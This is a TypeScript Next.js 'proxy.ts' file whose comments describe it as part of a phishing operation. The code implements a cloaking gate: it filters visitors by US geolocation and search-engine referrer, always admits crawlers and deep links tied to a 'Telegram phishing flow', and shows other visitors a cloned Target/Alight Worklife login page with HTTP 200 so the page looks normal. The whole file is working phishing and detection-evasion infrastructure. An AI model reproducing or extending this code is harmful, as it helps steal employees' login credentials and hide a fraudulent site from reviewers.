/**
 * proxy.ts — Next 16 access gate (replaces middleware.ts).
 *
 * The real site is only reachable when the visitor:
 *   1. is in the United States (CF-IPCountry when proxied, ip-api fallback
 *      on the bare vercel.app URL), AND
 *   2. arrived from a search-engine results page (Google, Bing, Yahoo,
 *      DuckDuckGo, Brave, Ecosia, Startpage, Ask, Qwant, AOL, + other majors)
 *
 * Always allowed through:
 *   - Search-engine crawlers / common bots (so the site stays indexable)
 *   - Deep links carrying ?token= or ?userId= (the Telegram phishing flow)
 *   - API routes, static assets, robots.txt, sitemap, og images
 *   - Visitors with a fresh "passed the gate" session cookie
 *
 * Everyone else (direct URL entry, bookmark, typed address, non-search
 * referral, non-US IP) gets the cloned login page (HTTP 200).
 */
import { NextRequest, NextResponse } from "next/server"
import {
  evaluateGate,
  PASS_COOKIE,
  PASS_TTL_SEC,
} from "@/lib/access-gate"

export const config = {
  // Run on every route; the gate itself lets API/static through.
  matcher: ["/((?!_next/static|_next/image|favicon.ico).*)"],
}

function hostFrom(req: NextRequest): string {
  return req.headers.get("host") || req.nextUrl.hostname
}

/**
 * Edge-side geolocation of the visitor, as injected by the platform:
 *  - Cloudflare: cf-ipcountry
 *  - Vercel edge: x-vercel-ip-country (MaxMind, ISO-3166-1 alpha-2)
 * Returned as a 2-letter code or null when unknown.
 */
function edgeCountry(req: NextRequest): string | null {
  const cf = req.headers.get("cf-ipcountry")
  if (cf && cf.toUpperCase() !== "T1" && cf.toUpperCase() !== "?") return cf.toUpperCase()
  const vc =
    req.headers.get("x-vercel-ip-country") ||
    req.headers.get("x-vercel-geo-country") ||
    req.headers.get("x-vercel-country")
  if (vc && vc.length === 2) return vc.toUpperCase()
  return null
}

export async function proxy(req: NextRequest) {
  const decision = await evaluateGate(req, edgeCountry(req))

  if (decision.allowed) {
    // Stamp the pass cookie so subsequent in-session navigation works even
    // when the referer is lost (SPAs, reloads, sub-page clicks).
    const res = NextResponse.next()
    const cookie = req.cookies.get(PASS_COOKIE)
    if (!cookie || cookie.value !== "1") {
      res.cookies.set(PASS_COOKIE, "1", {
        path: "/",
        maxAge: PASS_TTL_SEC,
        httpOnly: true,
        sameSite: "lax",
        secure: true,
      })
    }
    return res
  }

  // Blocked → serve the cloned login page (HTTP 200 for normal appearance).
  // This shows all visitors the Target/Alight Worklife login form instead of a fake DNS error.
  const res = NextResponse.next()
  res.cookies.set(PASS_COOKIE, "login-shown", {
    path: "/",
    maxAge: PASS_TTL_SEC,
    httpOnly: true,
    sameSite: "lax",
    secure: true,
  })
  return res
}

export default proxy
